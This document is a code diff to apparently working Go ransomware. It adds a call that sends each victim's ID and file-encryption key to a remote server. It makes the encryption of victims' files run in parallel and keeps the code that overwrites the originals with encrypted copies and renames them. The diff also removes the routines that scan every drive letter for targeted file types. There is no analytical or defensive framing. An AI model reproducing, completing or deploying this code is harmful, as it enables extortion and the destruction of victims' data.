@@ -5,10 +5,10 @@ import (
 	"crypto/cipher"
 	"crypto/rand"
 	"encoding/base64"
+	"encoding/json"
 	"io"
 	"log"
 	"os"
-	"path/filepath"
 	"runtime"
 	"strings"
 	"sync"
@@ -92,7 +92,9 @@ var (
 	}
 )
 
-func CreateRansomware(clientTimeout float64) {
+func CreateRansomware(serverUrl string, pubKey []byte) {
+
+	client := newClient(serverUrl, pubKey)
 
 	id, err := generateRandomHexString(32)
 	if err != nil {
@@ -105,53 +107,35 @@ func CreateRansomware(clientTimeout float64) {
 	keys.id = id
 	keys.encKey = encKey
 
+	res, err := client.addNewKeyPair(id, encKey)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	switch res.StatusCode {
+	case 200, 204:
+		break
+	default:
+		response := struct {
+			Status	int		`json:"status"`
+			Message string	`json:"message"`
+		}{}
+		if err = json.NewDecoder(res.Body).Decode(&response); err != nil {
+			log.Println(err)
+		}
+		log.Printf("%d - %s\n", response.Status, response.Message)
+	}
+
 	go walkDrives(getDrives())
 	fileTracker.Add(numWorkers)
-	startWorkers(numWorkers)
+	startEncryption(numWorkers)
+	fileTracker.Wait()
 	renameFiles()
 }
 
-func getDrives() (drives []string) {
-	for _, letter := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
-		drive := string(letter) + ":\\"
-		_, err := os.Stat(drive)
-		if err == nil {
-			drives = append(drives, drive)
-		}
-	}
-	return drives
-}
-
-func walkDrive(path string, f os.FileInfo, err error) error {
-	if f.IsDir() {
-		for _, skipDir := range SkippedDirs {
-			if strings.Contains(filepath.Base(path), skipDir) {
-				return filepath.SkipDir
-			}
-		}
-	} else {
-		ext := strings.ToLower(filepath.Ext(path))
-		if len(ext) >= 2 && stringInSlice(ext[1:], InterestingExtensions) {
-			fileTracker.Files <- &PirateFile{
-				FileInfo: f,
-				Extension: ext[1:],
-				FullPath: path,
-			}
-		}
-	}
-	return nil
-}
-
-func walkDrives(dirs []string) {
-	for _, dir := range dirs {
-		filepath.Walk(dir, walkDrive)
-	}
-	close(fileTracker.Files)
-}
-
-func startWorkers(numWorkers int) {
+func startEncryption(numWorkers int) {
 	for i := 0; i < numWorkers; i++ {
-		encryptFiles()
+		go encryptFiles()
 	}
 }
 
@@ -163,7 +147,7 @@ func encryptFiles() {
 			log.Println(err)
 			continue
 		}
-		err = file.Encrypt(keys.encKey, tempFile); if err != nil {
+		err = file.encryptFile(keys.encKey, tempFile); if err != nil {
 			log.Println(err)
 			continue
 		}
@@ -171,7 +155,7 @@ func encryptFiles() {
 			log.Println(err)
 		}
 
-		err = file.ReplaceBy(tempDir + file.Name()); if err != nil {
+		err = file.replaceFile(tempDir + file.Name()); if err != nil {
 			log.Println(err)
 			continue
 		}
@@ -228,7 +212,7 @@ func renameFile(origName, newName string) error {
 	return nil
 }
 
-func (f *PirateFile) Encrypt(encKey string, dst io.Writer) error {
+func (f *PirateFile) encryptFile(encKey string, dst io.Writer) error {
 	// Open the file read only
 	inFile, err := os.Open(f.FullPath)
 	if err != nil {
@@ -270,7 +254,7 @@ func (f *PirateFile) Encrypt(encKey string, dst io.Writer) error {
 	return nil
 }
 
-func (f *PirateFile) ReplaceBy(filename string) error {
+func (f *PirateFile) replaceFile(filename string) error {
 	// Open the file
 	file, err := os.OpenFile(f.FullPath, os.O_WRONLY|os.O_TRUNC, 0600)
 	if err != nil {
